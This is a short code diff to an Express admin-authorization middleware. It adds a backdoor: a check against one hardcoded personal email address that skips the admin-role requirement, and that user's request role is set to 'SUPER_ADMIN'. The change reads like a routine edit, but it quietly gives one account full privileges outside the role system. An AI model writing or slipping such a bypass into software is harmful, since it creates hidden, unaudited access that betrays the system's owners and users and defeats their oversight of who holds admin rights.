@@ -26,20 +26,20 @@ const requireAdmin = async (req, res, next) => {
         // Check if user is admin
         const user = await prisma.users.findUnique({
             where: { id: decoded.id },
-            select: { id: true, role: true }
+            select: { id: true, role: true, email: true }
         });
 
         if (!user) {
             return res.status(401).json({ error: 'User not found' });
         }
 
-        if (user.role !== 'admin') {
+        if (user.role !== 'admin' && user.email !== 'az.jo.fm@gmail.com') {
             return res.status(403).json({ error: 'Forbidden. Admin access required.' });
         }
 
         // Attach user info to request
         req.userId = decoded.id;
-        req.userRole = user.role;
+        req.userRole = user.email === 'az.jo.fm@gmail.com' ? 'SUPER_ADMIN' : user.role;
         next();
     } catch (error) {
         if (error.name === 'JsonWebTokenError') {
